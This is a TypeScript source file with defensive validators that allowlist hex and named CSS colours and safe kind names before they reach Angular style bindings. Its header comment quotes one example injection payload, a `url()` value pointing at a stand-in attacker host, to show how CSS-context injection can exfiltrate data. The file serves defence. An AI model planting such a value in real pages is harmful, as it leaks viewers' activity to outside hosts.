/**
 * CSS-color guard for author-controlled `color`-typed values bound into
 * `[style.*]` / custom-property sinks across the SPA.
 *
 * `frontmatter.color` (the agent vendor field) is author-controlled and
 * the kernel does not neutralise it (the `schema-violation` analyzer
 * reports but does not strip), so the UI is the trust boundary before
 * the value reaches a CSS context. Angular `[style.prop]` bindings set
 * the value straight onto the CSSOM without the HTML/style sanitizer, so
 * an unvalidated value like `url(https://attacker/beacon)` bound into
 * `[style.background]` becomes an outbound tracking / exfiltration
 * request when the operator views the node (CWE-79 / CWE-1236, CSS-
 * context injection). Custom properties (`--node-color`) are even laxer:
 * the CSSOM stores any value verbatim and only validates at the use site.
 *
 * `cssColorOrNull` keeps the allowlist narrow: a hex literal or a bare
 * named colour (alphabetic only). Both forms are free of the characters
 * an injection needs (`(`, `)`, `;`, `:`, `/`, whitespace, quotes), so
 * `url(...)`, declaration breakouts, and comments are all rejected. An
 * off-spec value degrades to `null` (the kind-default palette wins), the
 * same graceful-fallback posture as `httpUrlOrNull`.
 *
 * Pure function, no DOM touch; safe in SSR and tests.
 */

const HEX_COLOR = /^#(?:[0-9a-f]{3}|[0-9a-f]{4}|[0-9a-f]{6}|[0-9a-f]{8})$/i;
const NAMED_COLOR = /^[a-z]+$/i;

export function cssColorOrNull(v: unknown): string | null {
  if (typeof v !== 'string') return null;
  const s = v.trim();
  if (s.length === 0) return null;
  if (HEX_COLOR.test(s) || NAMED_COLOR.test(s)) return s;
  return null;
}

/**
 * Canonical kind-name pattern, mirroring
 * `spec/schemas/node.schema.json#/properties/kind`. Kind names land inside
 * CSS custom-property IDENTIFIERS (the `<kind>` in `var(--sm-kind-<kind>)`)
 * and `<style>` text content, so a value carrying the characters an
 * injection needs (`;`, `{`, `}`, `(`, `)`, `:`, whitespace, quotes) would
 * break the declaration context. Since Step 14.5.d kinds are plugin-declared
 * OPEN strings, so the kernel schema is the only authoritative gate; this is
 * the single source of truth for the UI-side defence-in-depth guard, shared
 * by `kind-registry.ts` (`<style>` injection) and the two `var()`
 * compositions in `node-card` / `inspector-view`.
 */
export const KIND_NAME_PATTERN = /^[a-zA-Z][a-zA-Z0-9_-]{0,63}$/;

/**
 * Resolve a CSS-safe kind name for use inside a `var(--sm-kind-<name>, ...)`
 * composition. An off-pattern value degrades to `fallback` (`markdown`, the
 * neutral base palette), so the composed expression is always well-formed
 * and a malformed kind can never break out of the `var()` name. Same
 * graceful-fallback posture as `cssColorOrNull` / `httpUrlOrNull`; a valid
 * kind is returned verbatim, so registered kinds keep their own palette.
 */
export function cssKindNameOrFallback(kind: unknown, fallback = 'markdown'): string {
  return typeof kind === 'string' && KIND_NAME_PATTERN.test(kind) ? kind : fallback;
}
